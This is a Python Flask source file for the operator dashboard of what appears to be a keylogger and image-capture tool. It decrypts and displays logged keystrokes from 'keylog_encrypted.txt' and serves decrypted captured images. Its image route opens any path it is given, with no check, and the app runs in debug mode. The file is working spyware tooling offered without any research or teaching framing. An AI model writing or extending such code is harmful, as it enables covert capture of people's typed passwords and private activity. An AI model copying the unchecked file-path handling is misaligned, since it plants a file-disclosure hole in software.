from flask import Flask, render_template, send_file, Response
from cryptography.fernet import Fernet
from encryption_utils import get_or_create_key
import os
from cryptography.fernet import InvalidToken
import io

app = Flask(__name__, static_folder='static')

# Use the shared encryption key
key = get_or_create_key()
cipher_suite = Fernet(key)

@app.route('/')
def index():
    keylog_entries = []
    image_paths = []

    # Debug logging
    print("Checking for keylog file...")
    
    if os.path.exists("keylog_encrypted.txt"):
        print("Found keylog file")
        try:
            with open("keylog_encrypted.txt", "rb") as f:
                encrypted_lines = f.readlines()
                print(f"Read {len(encrypted_lines)} encrypted lines")
                
                for i, encrypted_line in enumerate(encrypted_lines):
                    if encrypted_line.strip():
                        try:
                            decrypted_line = cipher_suite.decrypt(encrypted_line).decode()
                            keylog_entries.append(decrypted_line)
                            print(f"Successfully decrypted line {i+1}")
                        except Exception as e:
                            print(f"Error decrypting line {i+1}: {e}")
        except Exception as e:
            print(f"Error reading keylog: {e}")
    else:
        print("Keylog file not found")

    # Get image paths
    for file_name in os.listdir('.'):
        if file_name.startswith("encrypted_captured_image_"):
            image_paths.append(file_name)

    # Sort keylog entries by timestamp (assuming they start with timestamp)
    keylog_entries.sort(reverse=True)

    return render_template('index.html', 
                         keylog_entries=keylog_entries, 
                         image_paths=sorted(image_paths, reverse=True))

@app.route('/decrypt_image/<path:image_path>')
def decrypt_image(image_path):
    try:
        with open(image_path, "rb") as f:
            encrypted_data = f.read()
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        return Response(decrypted_data, mimetype='image/png')
    except InvalidToken:
        return send_file('static/error.png', mimetype='image/png')
    except Exception:
        return send_file('static/error.png', mimetype='image/png')

if __name__ == '__main__':
    app.run(debug=True)